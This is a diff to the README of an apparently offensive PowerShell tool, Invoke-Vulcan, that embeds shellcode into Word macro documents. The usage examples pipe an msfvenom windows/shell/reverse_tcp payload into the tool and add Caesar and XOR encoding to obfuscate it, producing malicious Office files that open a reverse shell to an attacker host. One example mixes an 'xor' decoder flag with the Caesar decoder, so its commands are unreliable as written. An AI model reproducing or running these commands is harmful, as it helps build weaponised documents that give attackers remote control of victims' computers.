@@ -53,7 +53,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 `Get-Help -Name Invoke-Vulcan` is your friend... Your best friend is `Get-Help -Name Invoke-Vulcan -Detailed`. Nonetheless, `Invoke-Vulcan` must be fed a `hex`-formatted shellcode. This can be achieved with:
 
 ```powershell
-Get-Content -Path $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
+Get-Content -Path $ShellCode | Invoke-Vulcan ...
 ```
 
 ```powershell
@@ -62,10 +62,10 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
 
 ### Examples
 
-- Embed a non-encoded shellcode:
+- Embed a "plain" shellcode:
 
     ```powershell
-    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
+    .\Invoke-Vulcan.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
@@ -74,9 +74,21 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
 - Embed a `Caesar`-encoded shellcode:
 
     ```powershell
-    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -CaesarShift 5
+    .\Invoke-Vulcan.ps1; . .\assets\encoders\Caesar.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+        Invoke-Caesar -Key 5 | `
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
     ```
+
+- Embed a `XOR`-encoded shellcode:
+
+    ```powershell
+    .\Invoke-Vulcan.ps1; . .\assets\encoders\Xor.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+        Invoke-XOR -Key "Star&WatchThisRepository" | `
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "Star&WatchThisRepository" -Verbose
+    ```
+
+    > [!WARNING]
+    > The length of the key must be shorted than the shellcode.
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
